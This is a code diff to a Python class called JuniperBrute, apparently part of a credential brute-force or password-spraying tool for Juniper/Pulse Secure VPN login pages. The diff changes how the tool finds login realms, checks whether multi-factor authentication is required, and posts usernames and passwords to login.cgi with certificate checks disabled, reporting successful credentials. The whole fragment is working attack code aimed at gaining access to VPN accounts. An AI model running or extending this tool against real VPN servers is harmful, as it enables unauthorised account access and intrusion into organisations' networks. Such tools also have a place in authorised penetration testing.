@@ -14,16 +14,20 @@ class JuniperBrute():
         print("[!] Checking for other logon pages...")
         for n in range(1, 20):
             URL = 'url_' + str(n)
-            u = c.get(config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/dana-na/auth/' + URL + '/welcome.cgi', allow_redirects=False, verify=False)
+            u = c.get(config["HOST"] + '/dana-na/auth/' + URL + '/welcome.cgi', allow_redirects=False, verify=False)
             if u.status_code == 200:
                 self.URLS.append(URL)
 
     def MFACheck(self, c, config, URL):
         print("[!] Checking to see if MultiFactor Authentication is required for " + URL + "...")
-        mfa = c.get(config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/dana-na/auth/' + URL + '/welcome.cgi', allow_redirects=False, verify=False)
+        mfa = c.get(config["HOST"] + '/dana-na/auth/' + URL + '/welcome.cgi', allow_redirects=False, verify=False)
         m = re.findall('<input (.*?)>', mfa.text, re.DOTALL)
-        n = re.findall('password.[0-9]', str(m))
-        if n:
+        n = re.findall('password', str(m))
+        o = re.search('Missing certificate', mfa.text)
+        if n.count("password") > 3:
+            print("[-]  MultiFactor Authentication Required for " + URL + "!")
+            return True
+        elif o:
             print("[-]  MultiFactor Authentication Required for " + URL + "!")
             return True
         else:
@@ -36,7 +40,7 @@ class JuniperBrute():
                 URL = 'url_default'
             else:
                 URL = self.nomfaurls[0]
-            cpost = c.post(config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/dana-na/auth/' + URL + '/login.cgi', data=payload, allow_redirects=False, verify=False)
+            cpost = c.post(config["HOST"] + '/dana-na/auth/' + URL + '/login.cgi', data=payload, allow_redirects=False, verify=False)
             m = re.search('p=user-confirm', str(cpost.headers))
             if m:
                 print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
@@ -45,7 +49,7 @@ class JuniperBrute():
     def payload(self, config):
         with session() as c:
             requests.packages.urllib3.disable_warnings()
-            cget = c.get(config["protocol"] + '://' + config["HOST"] + ':' + config["port"] + '/dana-na/auth/welcome.cgi', allow_redirects=True, verify=False)
+            cget = c.get(config["HOST"] + '/dana-na/auth/welcome.cgi', allow_redirects=True, verify=False)
             if cget.cookies:
                 URL = cget.cookies['DSSIGNIN']
             else:
